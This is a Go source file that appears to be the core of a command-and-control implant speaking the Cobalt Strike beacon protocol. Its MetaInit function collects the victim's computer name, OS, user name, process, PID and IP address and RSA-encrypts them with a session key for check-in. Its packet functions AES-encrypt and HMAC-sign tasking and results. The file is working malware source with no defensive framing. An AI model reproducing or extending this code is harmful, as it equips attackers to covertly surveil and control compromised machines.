package core

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"runtime"
	"strings"
)

var (
	Counter  int
	BeaconID = GetID()
	MetaByte = MetaInit()
)

func MetaInit() []byte {
	Key     := RandomKey(16)
	ANSI    := IntAsByte(2, 65001)
	OEM     := IntAsByte(2, GetOEM())
	ID      := IntToByte(4, BeaconID)
	PID     := IntToByte(4, GetPID())
	Port    := IntToByte(2, 0)
	Flag    := IntToByte(1, GetFlag())
	OSVer   := IntToByte(2, 0)
	Build   := IntToByte(2, 0)
	PTR     := IntToByte(4, 0)
	PTR_GMH := IntToByte(4, 0)
	PTR_GPA := IntToByte(4, 0)
	Meta    := JoinBytes(Key, ANSI, OEM, ID, PID, Port, Flag, OSVer, Build, PTR, PTR_GMH, PTR_GPA, GetIPAddress(), []byte(fmt.Sprintf("%s (%s)\t%s\t%s", GetComputer(), strings.Title(runtime.GOOS), GetUserName(), GetProcess())))
	return RSAEncrypt(JoinBytes(IntToByte(4, 48879), IntToByte(4, len(Meta)), Meta))
}

func MakeBytes(Type int, Data ...[]byte) {
	Counter++; Num := IntToByte(4, Counter)
	Buf := JoinBytes(IntToByte(4, Type), bytes.Join(Data, []byte("")))
	AES := AESEncrypt(JoinBytes(Num, IntToByte(4, len(Buf)), Buf))
	Buffer.Write(JoinBytes(IntToByte(4, len(AES)+16), AES, HmacHash(AES)))
}

func ParseBytes(Bytes []byte) *bytes.Buffer {
	if len(Bytes) < 32 { return nil }
	Data := Bytes[:len(Bytes)-16]
	Hash := hex.EncodeToString(Bytes[len(Bytes)-16:])
	if Hash != hex.EncodeToString(HmacHash(Data)) { return nil }
	Data = AESDecrypt(Data)
	Len := ByteToInt(Data[4:8])
	return bytes.NewBuffer(Data[8:Len+8])
}